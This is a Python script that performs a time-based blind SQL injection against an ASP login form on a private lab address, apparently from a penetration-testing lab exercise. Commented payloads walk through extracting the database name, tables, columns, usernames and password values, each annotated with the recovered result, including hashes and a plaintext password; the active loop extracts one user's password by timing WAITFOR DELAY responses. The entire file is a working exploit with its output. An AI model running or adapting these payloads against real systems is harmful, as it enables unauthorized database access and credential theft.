#!/usr/bin/env python3
# xen was here

import requests
import time

charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$^&*()-_=+{}'
result = ""

url = "http://10.11.1.128:4167/loginform.asp?"

for i in range(1,100):
    for c in charset:
        # DB
        #payload = "uname='IF+SUBSTRING(DB_NAME(),{},1)='{}'+WAITFOR+DELAY+'0:0:5';--+-'&psw=a".format(i,c) -> music

        # USER
        #payload = "uname='IF+SUBSTRING(USER_NAME(),{},1)='{}'+WAITFOR+DELAY+'0:0:5';--+-'&psw=a".format(i,c) -> dbo

        # TABLES
        #payload = "uname='IF+SUBSTRING((SELECT+name+FROM+music..sysobjects+WHERE+xtype='U'+ORDER+BY+name+OFFSET+0+ROWS+FETCH+NEXT+1+ROWS+ONLY),{},1)='{}'+WAITFOR+DELAY+'0:0:5';--+-'&psw=a".format(i,c) -> albums
        #payload = "uname='IF+SUBSTRING((SELECT+name+FROM+music..sysobjects+WHERE+xtype='U'+ORDER+BY+name+OFFSET+1+ROWS+FETCH+NEXT+1+ROWS+ONLY),{},1)='{}'+WAITFOR+DELAY+'0:0:5';--+-'&psw=a".format(i,c) -> concerts
        #payload = "uname='IF+SUBSTRING((SELECT+name+FROM+music..sysobjects+WHERE+xtype='U'+ORDER+BY+name+OFFSET+2+ROWS+FETCH+NEXT+1+ROWS+ONLY),{},1)='{}'+WAITFOR+DELAY+'0:0:5';--+-'&psw=a".format(i,c) -> singles
        #payload = "uname='IF+SUBSTRING((SELECT+name+FROM+music..sysobjects+WHERE+xtype='U'+ORDER+BY+name+OFFSET+4+ROWS+FETCH+NEXT+1+ROWS+ONLY),{},1)='{}'+WAITFOR+DELAY+'0:0:5';--+-'&psw=a".format(i,c) -> sqlmapoutput
        #payload = "uname='IF+SUBSTRING((SELECT+name+FROM+music..sysobjects+WHERE+xtype='U'+ORDER+BY+name+OFFSET+5+ROWS+FETCH+NEXT+1+ROWS+ONLY),{},1)='{}'+WAITFOR+DELAY+'0:0:5';--+-'&psw=a".format(i,c) -> users
        
        # COLUMNS
        #payload = "uname='IF+SUBSTRING((SELECT+name+FROM+syscolumns+WHERE+id=(SELECT+id+FROM+sysobjects+WHERE+name='users')+ORDER+BY+name+OFFSET+0+ROWS+FETCH+NEXT+1+ROWS+ONLY),{},1)='{}'+WAITFOR+DELAY+'0:0:5';--+-'&psw=a".format(i,c) -> id
        #payload = "uname='IF+SUBSTRING((SELECT+name+FROM+syscolumns+WHERE+id=(SELECT+id+FROM+sysobjects+WHERE+name='users')+ORDER+BY+name+OFFSET+1+ROWS+FETCH+NEXT+1+ROWS+ONLY),{},1)='{}'+WAITFOR+DELAY+'0:0:5';--+-'&psw=a".format(i,c) -> name
        #payload = "uname='IF+SUBSTRING((SELECT+name+FROM+syscolumns+WHERE+id=(SELECT+id+FROM+sysobjects+WHERE+name='users')+ORDER+BY+name+OFFSET+2+ROWS+FETCH+NEXT+1+ROWS+ONLY),{},1)='{}'+WAITFOR+DELAY+'0:0:5';--+-'&psw=a".format(i,c) -> pass
        
        # DATA (name)
        #payload = "uname='IF+SUBSTRING((SELECT+name+FROM+users+ORDER+BY+name+OFFSET+0+ROWS+FETCH+NEXT+1+ROWS+ONLY),{},1)='{}'+WAITFOR+DELAY+'0:0:5';--+-'&psw=a".format(i,c) -> alice
        #payload = "uname='IF+SUBSTRING((SELECT+name+FROM+users+ORDER+BY+name+OFFSET+1+ROWS+FETCH+NEXT+1+ROWS+ONLY),{},1)='{}'+WAITFOR+DELAY+'0:0:5';--+-'&psw=a".format(i,c) -> brett
        #payload = "uname='IF+SUBSTRING((SELECT+name+FROM+users+ORDER+BY+name+OFFSET+2+ROWS+FETCH+NEXT+1+ROWS+ONLY),{},1)='{}'+WAITFOR+DELAY+'0:0:5';--+-'&psw=a".format(i,c) -> eric
        #payload = "uname='IF+SUBSTRING((SELECT+name+FROM+users+ORDER+BY+name+OFFSET+3+ROWS+FETCH+NEXT+1+ROWS+ONLY),{},1)='{}'+WAITFOR+DELAY+'0:0:5';--+-'&psw=a".format(i,c) -> peter

        # DATA (pass)
        #payload = "uname='IF+SUBSTRING((SELECT+pass+FROM+users+WHERE+name='alice'),{},1)='{}'+WAITFOR+DELAY+'0:0:5';--+-'&psw=a".format(i,c) -> 5f4dcc3b5aa765d61d8327deb882cf99
        #payload = "uname='IF+SUBSTRING((SELECT+pass+FROM+users+WHERE+name='brett'),{},1)='{}'+WAITFOR+DELAY+'0:0:5';--+-'&psw=a".format(i,c) -> 34819d7beeabb9260a5c854bc85b3e44
        #payload = "uname='IF+SUBSTRING((SELECT+pass+FROM+users+WHERE+name='eric'),{},1)='{}'+WAITFOR+DELAY+'0:0:5';--+-'&psw=a".format(i,c) -> 123pass123
        #payload = "uname='IF+SUBSTRING((SELECT+pass+FROM+users+WHERE+name='peter'),{},1)='{}'+WAITFOR+DELAY+'0:0:5';--+-'&psw=a".format(i,c) -> 7d9264f1c1c042b799ef08da95a782d4
        payload = "uname='IF+SUBSTRING((SELECT+pass+FROM+users+WHERE+name='peter'),{},1)='{}'+WAITFOR+DELAY+'0:0:5';--+-'&psw=a".format(i,c)
        sqli_attack = url+payload
        start = time.time()
        r = requests.get(sqli_attack)
        roundtrip = time.time() - start

        if roundtrip >= 5:
            result += c 
            print(result)
            break;



